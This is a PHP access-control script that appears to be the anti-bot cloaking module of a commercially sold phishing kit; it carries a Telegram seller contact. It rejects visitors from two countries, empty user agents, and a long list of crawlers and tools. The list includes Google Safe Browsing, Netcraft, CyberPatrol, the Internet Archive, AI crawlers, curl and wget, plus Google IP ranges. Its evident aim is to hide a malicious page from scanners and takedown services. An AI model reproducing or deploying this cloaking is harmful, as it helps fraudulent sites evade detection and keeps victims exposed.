<?php
// Holla on TG @Fast_0610

// Include file to get visitor country
require_once 'xend.php';

// List of blocked countries
$blocked_countries = [
    // 'No IP Response',
    // 'Unknown',
    'KP',
    'NG'
];

// List of blocked bots (expansion as needed)
$blocked_bots = [
    // Major Search Engine Crawlers
    'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot',
    'Sogou', 'Exabot', 'ia_archiver',

    // SEO & Marketing Bots
    'AhrefsBot', 'SemrushBot', 'DotBot', 'MJ12bot', 'MajesticBot',
    'SerpstatBot', 'SiteAuditBot', 'SiteCheckerBot', 'SEOCheckBot',

    // Social Media Bots
    'FacebookBot', 'Twitterbot', 'LinkedInBot', 'Pinterestbot',
    'Discordbot', 'WhatsApp', 'WeChatBot',

    // Headless Browsers & Automation Tools
    'HeadlessChrome', 'PhantomJS', 'Puppeteer', 'Selenium',

    // AI & Web Scrapers
    'GPTBot', 'ClaudeBot', 'ChatGPT-User-Agent', 'PerplexityBot', 'Bard',
    'AnthropicAI', 'ZeroClickInfo', 'DataForSeoBot', 'AI-Content-Checker',

    // Other Web Crawlers & Probers
    'Google-InspectionTool', 'Google-Fetcher', 'Google Web Preview',
    'Google-AMPHTML', 'Google-Safebrowsing', 'Google Page Speed Insights',
    'Amazonbot', 'Alexa Crawler', 'Applebot', 'AppleNewsBot',
    'Yahoo-MMCrawler', 'YahooSeeker', 'BingPreview', 'BingLocalSearch',
    'CCBot', 'MegaIndex', 'Swiftbot', 'NetcraftSurveyAgent',
    'CyberPatrol', 'SentinelBot',

    // Command-line Scrapers & Downloaders
    'Python-urllib', 'Scrapy', 'curl', 'wget'
];

// List of blocked IP addresses (expansion as needed)
$blocked_ips = [
    '66.249.', // Googlebot
    '157.55.', // Bingbot
    '74.6.',   // Yahoo Slurp
    '185.191.171.', // Ahrefs
    '207.241.237.', // Internet Archive Bot
    '64.233.160.', '64.233.161.', '64.233.162.', '64.233.163.', '64.233.164.', // Google Safe Browsing
    '66.102.0.', '66.102.1.', '66.102.2.', '66.102.3.', '66.102.4.', '66.102.5.', '66.102.6.', '66.102.7.', // More Google IPs
    '216.239.32.', '216.239.33.', '216.239.34.', '216.239.35.' // Google Crawlers
];

// Get user agent and IP address
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$user_ip = $_SERVER['REMOTE_ADDR'] ?? '';

// Deny access for blocked countries
if (in_array($ip_country, $blocked_countries)) {
    header("HTTP/1.1 403 Forbidden");
    exit("<h4>We’re sorry, but access from your IP: $ip [$ip_country] is strictly prohibited.</h4>");

}

// Block empty User-Agent (common for headless bots)
if (empty($user_agent)) {
    header("HTTP/1.1 403 Forbidden");
    exit("Access Denied");
}

// Check for blocked bots in User-Agent
foreach ($blocked_bots as $bot) {
    if (stripos($user_agent, $bot) !== false) {
        header("HTTP/1.1 403 Forbidden");
        exit("Access Denied");
    }
}

// Check for blocked IP ranges
foreach ($blocked_ips as $blocked_ip) {
    if (strpos($user_ip, $blocked_ip) === 0) {
        header("HTTP/1.1 403 Forbidden");
        exit("Access Denied");
    }
}

// Holla on TG @Fast_0610
?>
